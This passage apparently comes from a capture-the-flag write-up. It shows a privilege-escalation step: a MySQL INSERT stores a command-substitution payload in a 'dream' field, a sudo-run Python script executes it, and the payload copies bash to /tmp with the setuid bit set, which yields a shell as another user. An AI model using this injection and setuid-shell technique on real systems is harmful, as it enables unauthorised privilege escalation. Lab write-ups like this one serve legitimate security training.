### shell by mysql
`INSERT INTO dreams (dreamer, dream) VALUES ('0xb0b','$(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash)');`

![](https://0xb0b.gitbook.io/~gitbook/image?url=https%3A%2F%2F2148487935-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FoqaFccsCrwKo1CHmLRKW%252Fuploads%252FWo9b0okktfG9jClq0n5G%252Fgrafik.png%3Falt%3Dmedia%26token%3Df3042a73-fd20-4dfe-af08-60a2d8992c61&width=768&dpr=4&quality=100&sign=ddd3947a&sv=1)


```mysql
+---------+------------------------------------------------+
| dreamer | dream                                          |
+---------+------------------------------------------------+
| Alice   | Flying in the sky                              |
| Bob     | Exploring ancient ruins                        |
| Carol   | Becoming a successful entrepreneur             |
| Dave    | Becoming a professional musician               |
| 0xb0b   | $(cp /bin/bash /tmp/bash; chmod +xs /tmp/bash) |
+---------+------------------------------------------------+
5 rows in set (0.00 sec)

```

We run `sudo -u death /usr/bin/python3 /home/death/getDreams.py` after making the entry in the database, and the bash is copied to `/tmp`.

Now, with executing `/tmp/bash -p` we now have a shell as `death`.